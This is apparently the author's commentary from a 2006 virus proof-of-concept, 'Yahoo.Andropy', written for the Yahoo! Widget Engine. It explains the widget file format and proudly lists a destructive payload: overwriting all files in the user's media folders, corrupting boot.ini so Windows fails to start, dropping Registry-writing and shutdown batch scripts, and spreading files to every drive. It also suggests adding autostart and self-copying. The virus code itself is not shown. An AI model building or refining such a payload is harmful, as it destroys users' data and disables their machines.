	First of all, when you read the whole code you might notice that I often used " [SkyOut] .... " this is
	not because I love myself so much, I just wanted to show how to use that engine and its feature for several things.
	The first time I heard of that engine was quite a long time ago, somewhere in winter 2005 I think... I hope that's not wrong...
	It was in some computer magazine and it was meant to be something like "coding for everyone"... Yeah in some way I can say it's
	true, coding for that engine is really like scripting, nothing difficult, but nevertheless or because of this MUCH fun =)
	The idea to make this virus came to me when visiting some sites, where people talked about "customizing XP" and often they did it
	by using interesting widgets, so guess what... I visited Yahoo! website and looked for stuff to read to start developing, well and
	even this is simple, one beginners guide (~20 sites) and the reference (~300 sites). Oh and very important: The Widget Converter, this
	is a tool to build the widgets (*.widget) out of a folder containing the ressources, the good thing is, you can use that converter to
	get the folder with its ressources out of the widget file, too. So vice versa! The interesting thing maybe is, that the *.widget file is
	nothing more then a *.zip file... Try making a *.zip file out of your ressources and rename *.zip to *.widget, double click and believe!
	
	Structure of such a *.widget folder is simple, but remember to do it like this:
	
	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	
	[Folder: Name of your final *.widget file, decide yourself]
	===========================================================
	+++	      +++
	+++ including +++
	+++	      +++
	[Folder: " Contents " Name it like this and nothing else!]
	==========================================================
	->*.kon file (THIS FILE MUST BE IN " Contents " FOLDER!)
	
	->other files... *.js, *.png, *.jpg... -> could also be stored in several subfolders! From here decide
	for yourself how many subfolders you want to have, how the structure should be!
	
	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	
	
	Hmm... enough background information from my side...
	for more information visit the site of our friend Yahoo! =) -> www.yahoo.com and widgets.yahoo.com for the widgets, even if you don't
	want to develop them, take a look, very cool stuff! I like it!
	
	=========================================================
	=========================================================
	
	Tested on: Windows XP SP 2 (Sorry, I don't have a MAC to test it =( ... would have been nice)
	Finished: 21. August 2006
	Site: www.eof-project.net
	Greets to: rRlf (www.rrlf.de.vu), Doom Riderz (www.doomriderz.co.nr) and Cyber Underground Project (cup.su)
	-> more links on the site!
	
	Size (*.widget file on my Windows machine): ~95 KB
	
	Payload of Yahoo.Andropy:
	
	-> Try to show example of appending to a file on ~/append.txt
	-> Try to show example of prepending to a file on ~/prepend.txt
	-> Overwrite all files in desktop, pictures, movies, music, wigdet... folders
	-> Copy a text file to the users home directory and every connected drive
	-> Open EOF site with users standard web browser =D
	-> Check if the running OS is Windows, if yes...
		-> Manipulate boot.ini file (must be on C drive), this will result in an error next time user tries to start PC
		-> Drop a batch script to access the Registry and write some information there
		-> Drop a batch script to shut down the system
		
	=========================================================
	=========================================================
	
	Some final thoughts... Well until the end I was not sure how to handle the thing with copying itself somewhere... try yourself would be
	the best maybe, if you do so, it could be interesting to make some autostart of the widget, copy somewhere, drop a batch file accessing the
	registry and adding the needed entries! Remember the engine has to run so the *.widget file can be execute, but the nice thing about the
	engine is, when you execute a widget file without the engine running, it will open the engine automatically, thanks Yahoo! So even
	autostarting shouldn't be that hard =) Well what you have seen until now might be, that this engine provides some nice things but often you
	have to use extra files, doing it over batch files or whatever to have real access to system... Enjoy!

Hey hey Yahoo! Your engine is cool... really and this is a virus for it...\n\
I began to like scripting for that engine, it was fun coding this PoC, i enjoyed...\n\
and most I like that this will work on Mac OS X, too, that is a cool thing! =D\n\
Best regards\n[SkyOut]\n[Electrical Ordered Freedom]\n\n\

would be even more fun!";
